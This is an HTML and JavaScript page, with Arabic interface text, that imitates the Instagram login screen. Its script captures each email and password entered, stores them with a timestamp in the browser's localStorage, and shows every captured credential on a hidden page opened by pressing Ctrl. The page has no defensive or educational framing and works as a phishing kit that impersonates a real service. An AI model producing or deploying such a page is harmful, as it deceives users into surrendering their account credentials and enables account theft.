<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • انستقرام</title>
    <style>
        /* جميع أنماط CSS السابقة تبقى كما هي */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px;
            text-align: center;
            width: 350px;
        }

        .logo {
            font-family: 'Billabong', cursive;
            font-size: 45px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 9px 8px;
            margin: 3px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
        }

        input:focus {
            outline: none;
            border: 1px solid #a8a8a8;
        }

        button {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px;
            margin: 12px 0;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #1877f2;
        }

        .links {
            margin: 15px 0;
            color: #385185;
            font-size: 14px;
        }

        .links a {
            color: #385185;
            text-decoration: none;
            font-weight: bold;
        }

        .footer {
            margin-top: 20px;
            color: #8e8e8e;
            font-size: 14px;
        }

        @font-face {
            font-family: 'Billabong';
            src: url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong.ttf') format('truetype');
        }

        /* أنماط الصفحة الجديدة */
        #dataPage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            padding: 20px;
            overflow-y: auto;
        }

        .data-item {
            padding: 10px;
            border-bottom: 1px solid #dbdbdb;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        
        <form id="loginForm">
            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>

        <div class="links">
            <a href="#">هل نسيت كلمة المرور؟</a>
        </div>
        
        <div class="footer">
            ليس لديك حساب؟ <a href="#" style="color:#0095f6;">سجل هنا</a>
        </div>
    </div>

    <div id="dataPage">
        <h2>البيانات المحفوظة</h2>
        <div id="savedData"></div>
        <button onclick="hideDataPage()">إغلاق</button>
    </div>

    <script>
        // حفظ البيانات عند التسجيل
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // إنشاء كائن للبيانات
            const userData = {
                email: email,
                password: password,
                timestamp: new Date().toLocaleString()
            };
            
            // الحصول على البيانات القديمة أو إنشاء مصفوفة جديدة
            const savedData = JSON.parse(localStorage.getItem('userData')) || [];
            savedData.push(userData);
            
            // حفظ البيانات في localStorage
            localStorage.setItem('userData', JSON.stringify(savedData));
            
            // تفريغ الحقول بعد التسجيل
            document.getElementById('loginForm').reset();
        });

        // عرض البيانات عند الضغط على Ctrl
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey) {
                showDataPage();
            }
        });

        function showDataPage() {
            const dataPage = document.getElementById('dataPage');
            const savedDataDiv = document.getElementById('savedData');
            
            // مسح المحتوى القديم
            savedDataDiv.innerHTML = '';
            
            // جلب البيانات من localStorage
            const savedData = JSON.parse(localStorage.getItem('userData')) || [];
            
            // عرض كل البيانات
            savedData.forEach(data => {
                const dataItem = document.createElement('div');
                dataItem.className = 'data-item';
                dataItem.innerHTML = `
                    <strong>البريد:</strong> ${data.email}<br>
                    <strong>كلمة المرور:</strong> ${data.password}<br>
                    <small>${data.timestamp}</small>
                `;
                savedDataDiv.appendChild(dataItem);
            });
            
            dataPage.style.display = 'block';
        }

        function hideDataPage() {
            document.getElementById('dataPage').style.display = 'none';
        }
    </script>
</body>
</html>
